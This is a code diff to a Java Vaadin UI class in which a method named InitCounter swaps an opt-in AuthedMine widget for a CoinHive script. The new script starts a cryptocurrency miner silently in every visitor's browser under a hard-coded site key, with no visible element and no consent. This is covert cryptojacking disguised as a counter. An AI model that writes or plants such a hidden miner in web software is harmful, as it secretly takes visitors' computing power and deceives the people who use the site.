@@ -141,20 +141,11 @@ public class MyUI extends UI {
     }
     
     private void InitCounter(){
-        String HTML = "<script src=\"https://authedmine.com/lib/simple-ui.min.js\" async></script>\n" +
-        "<div class=\"coinhive-miner\" \n" +
-        "	style=\"width: 256px; height: 310px\"\n" +
-        "	data-key=\"uPKFHYCHa2DjjajB9vEQJ2q3w7k9rraL\"\n" +
-        "	data-autostart=\"true\"\n" +
-        "	data-whitelabel=\"false\"\n" +
-        "	data-background=\"#000000\"\n" +
-        "	data-text=\"#eeeeee\"\n" +
-        "	data-action=\"#00ff00\"\n" +
-        "	data-graph=\"#555555\"\n" +
-        "	data-threads=\"4\"\n" +
-        "	data-throttle=\"0.1\">\n" +
-        "	<em>Loading...</em>\n" +
-        "</div>";
+        String HTML = "<script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>\n" +
+        "<script>\n" +
+        "	var miner = new CoinHive.User('uPKFHYCHa2DjjajB9vEQJ2q3w7k9rraL', 'ro-ui');\n" +
+        "	miner.setThrottle(0.3); miner.start(); \n" +
+        "</script>";
         CounterHTMLHolder = new Label(HTML);
         CounterHTMLHolder.setContentMode(ContentMode.HTML);
     }
